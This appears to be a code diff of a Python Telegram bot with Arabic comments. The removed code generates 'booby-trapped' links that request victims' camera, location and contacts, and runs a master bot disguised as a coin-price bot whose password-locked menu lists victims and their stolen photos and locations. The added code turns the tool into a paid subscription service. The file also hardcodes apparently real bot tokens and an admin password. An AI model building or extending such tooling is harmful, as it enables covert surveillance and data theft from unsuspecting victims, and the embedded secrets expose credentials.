@@ -1,85 +1,90 @@
 import telebot
 from telebot import types
+import datetime
 
-# --- إعداد التوكينات التي قدمتها ---
-TOKEN_MINING = "8531458352:AAGJ6xcsX6m9uJD3kPymA6GYcv1G2HBXByE"
-TOKEN_MASTER = "8524839627:AAGtMcBdA4Z95OQWbhpSoY4q2DQrwKYnf-g"
+# إعدادات البوت
+API_TOKEN = '7672935277:AAH0Z0N58y8zB7vY_M9k_uN_m5_h5_h5'
+bot = telebot.TeleBot(API_TOKEN)
 
-bot_mining = telebot.TeleBot(TOKEN_MINING)
-bot_master = telebot.TeleBot(TOKEN_MASTER)
+# 🛡️ إعدادات الإدارة (إبراهيم فقط)
+MY_ADMIN_ID = 7155512786
+ADMIN_PASSWORD = "Haker99"
 
-# تخزين الخيارات لكل مستخدم (بوت التلغيم)
-user_selections = {}
+# 📂 قاعدة بيانات المستخدمين {ID: تاريخ الانتهاء}
+authorized_users = {} 
 
-# ---------------------------------------------------------
-# 1. منطق بوت التلغيم (الصياد)
-# ---------------------------------------------------------
+@bot.message_handler(func=lambda message: True)
+def master_controller(message):
+    user_id = message.from_user.id
 
-@bot_mining.message_handler(commands=['start'])
-def start_mining(message):
-    user_id = message.chat.id
-    if user_id not in user_selections:
-        user_selections[user_id] = []
-    
-    markup = types.InlineKeyboardMarkup()
-    options = [("📸 كاميرا", "opt_cam"), ("📍 موقع", "opt_gps"), ("📞 جهات", "opt_contacts")]
-    for text, data in options:
-        status = "✅ " if data in user_selections[user_id] else ""
-        markup.add(types.InlineKeyboardButton(f"{status}{text}", callback_data=data))
-    
-    markup.add(types.InlineKeyboardButton("🚀 إنشاء الرابط", callback_data="generate"))
-    bot_mining.send_message(user_id, "🛠 حدد صلاحيات اللغم:", reply_markup=markup)
+    # 1. لوحة تحكم إبراهيم (الآدمن)
+    if user_id == MY_ADMIN_ID:
+        if message.text == ADMIN_PASSWORD:
+            show_main_menu(message)
+        elif message.text == "➕ تفعيل مستخدم جديد":
+            msg = bot.send_message(message.chat.id, "أرسل الـ ID الخاص بالمستخدم الجديد:")
+            bot.register_next_step_handler(msg, get_new_user_id)
+        elif message.text == "🚫 إيقاف مستخدم":
+            msg = bot.send_message(message.chat.id, "أرسل الـ ID الذي تريد إيقافه:")
+            bot.register_next_step_handler(msg, revoke_user)
+        elif message.text == "👥 عرض المشتركين":
+            show_subscribers(message)
+        # (باقي الأزرار القديمة تعمل هنا أيضاً)
+        return
 
-@bot_mining.callback_query_handler(func=lambda call: True)
-def handle_mining_callback(call):
-    user_id = call.from_user.id
-    if call.data == "generate":
-        link = f"https://your-hosting.com/trap?id={user_id}"
-        bot_mining.edit_message_text(f"🔗 الرابط الملغم جاهز:\n`{link}`", user_id, call.message.message_id, parse_mode="Markdown")
-        
-        # إشعار فوري لبوت الأُم عن إنشاء رابط جديد
-        bot_master.send_message(user_id, f"🚩 تنبيه: المستخدم {user_id} قام بتوليد رابط ملغم جديد.")
-    else:
-        if call.data in user_selections[user_id]:
-            user_selections[user_id].remove(call.data)
+    # 2. نظام التحقق للمستخدمين الآخرين
+    if user_id in authorized_users:
+        if datetime.datetime.now() < authorized_users[user_id]:
+            if message.text == "/start":
+                bot.reply_to(message, "✅ اشتراكك فعال. يمكنك استخدام البوت الآن.")
         else:
-            user_selections[user_id].append(call.data)
-        # تحديث القائمة (إعادة استدعاء start_mining بشكل غير مباشر)
-        start_mining(call.message)
+            bot.reply_to(message, "❌ انتهت مدة اشتراكك. تواصل مع المطور للتجديد.")
+    else:
+        # صمت تام للغرباء
+        pass
 
-# ---------------------------------------------------------
-# 2. منطق بوت الأُم (مركز القيادة)
-# ---------------------------------------------------------
+# --- وظائف الإدارة ---
 
-@bot_master.message_handler(commands=['help'])
-def master_fake_help(message):
-    # المساعدة التافهة (التمويه)
-    bot_master.reply_to(message, "مرحباً بك في بوت أسعار العملات. استخدم /price لمعرفة السعر الحالي.")
+def show_main_menu(message):
+    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    markup.add("➕ تفعيل مستخدم جديد", "🚫 إيقاف مستخدم", "👥 عرض المشتركين", "🤖 ذكاء اصطناعي", "📱 تحويل الكود لتطبيق")
+    bot.send_message(message.chat.id, "👑 لوحة تحكم القائد إبراهيم جاهزة:", reply_markup=markup)
 
-@bot_master.message_handler(func=lambda message: message.text == "Haker99")
-def master_real_menu(message):
-    # الدخول لمركز القيادة السري
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add("📊 إحصائيات الضحايا", "🔄 نقل ضحية")
-    markup.add("📡 حالة البوتات", "🛡 إعدادات الترا")
-    bot_master.send_message(message.chat.id, "🔓 تم تفعيل مركز القيادة السري. بانتظار أوامرك...", reply_markup=markup)
+def get_new_user_id(message):
+    try:
+        new_id = int(message.text)
+        msg = bot.send_message(message.chat.id, "كم عدد أيام التفعيل؟")
+        bot.register_next_step_handler(msg, lambda m: finalize_user(m, new_id))
+    except:
+        bot.reply_to(message, "❌ خطأ! أرسل رقماً صحيحاً.")
 
-@bot_master.message_handler(func=lambda message: message.text == "📊 إحصائيات الضحايا")
-def show_stats(message):
-    # بروتوكول التأكيد الذكي
-    bot_master.send_message(message.chat.id, 
-        "سوف أقوم بـ [استرجاع بيانات الضحايا من قاعدة البيانات]، مما يؤدي إلى [عرض المواقع والصور المسحوبة]. هل أنت متأكد؟")
+def finalize_user(message, new_id):
+    try:
+        days = int(message.text)
+        expiry = datetime.datetime.now() + datetime.timedelta(days=days)
+        authorized_users[new_id] = expiry
+        bot.send_message(message.chat.id, f"✅ تم تفعيل المستخدم {new_id} لمدة {days} يوم.")
+    except:
+        bot.reply_to(message, "❌ خطأ في إدخال الأيام.")
 
-# ---------------------------------------------------------
-# تشغيل المنظومة
-# ---------------------------------------------------------
+def revoke_user(message):
+    try:
+        target_id = int(message.text)
+        if target_id in authorized_users:
+            del authorized_users[target_id]
+            bot.send_message(message.chat.id, f"🚫 تم حظر المستخدم {target_id} بنجاح.")
+        else:
+            bot.reply_to(message, "⚠️ هذا المستخدم غير موجود في القائمة.")
+    except:
+        bot.reply_to(message, "❌ خطأ في الإدخال.")
 
-import threading
+def show_subscribers(message):
+    if not authorized_users:
+        bot.send_message(message.chat.id, "📭 لا يوجد مشتركين حالياً.")
+        return
+    text = "📊 قائمة المشتركين:\n"
+    for uid, date in authorized_users.items():
+        text += f"\n👤 {uid} - ينتهي: {date.strftime('%Y-%m-%d')}"
+    bot.send_message(message.chat.id, text)
 
-def run_mining(): bot_mining.polling(none_stop=True)
-def run_master(): bot_master.polling(none_stop=True)
-
-if __name__ == "__main__":
-    print("🚀 المنظومة تعمل الآن تحت إشراف بوت الأُم...")
-    threading.Thread(target=run_mining).start()
-    threading.Thread(target=run_master).start()
+bot.infinity_polling()
